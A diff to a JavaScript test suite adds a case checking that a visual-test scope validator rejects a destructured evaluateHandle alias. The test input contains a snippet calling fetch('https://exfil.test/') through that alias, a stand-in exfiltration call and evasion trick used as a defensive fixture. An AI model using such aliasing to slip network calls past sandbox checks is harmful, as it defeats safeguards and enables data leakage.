@@ -470,6 +470,19 @@ test("G8 rejects an extracted evaluateHandle method alias", async () => {
   assert.match(result.output, /network capability/i);
 });
 
+test("G8 rejects a destructured evaluateHandle method alias", async () => {
+  const result = await runVisualScope({
+    routes: ACTIVE_ROUTES,
+    source: visualSpec(SCREENS, {
+      additionalVisualOperationFor: "work list @visual",
+      additionalVisualOperationCode: `const root = page.locator("#storybook-root"); const source = "() => fetch('https://exfil.test/')"; const { evaluateHandle: run } = root; await run(source);`,
+    }),
+  });
+
+  assert.notEqual(result.status, 0);
+  assert.match(result.output, /network capability/i);
+});
+
 test("G8 rejects computed evaluateHandle access on a locator alias", async () => {
   const result = await runVisualScope({
     routes: ACTIVE_ROUTES,
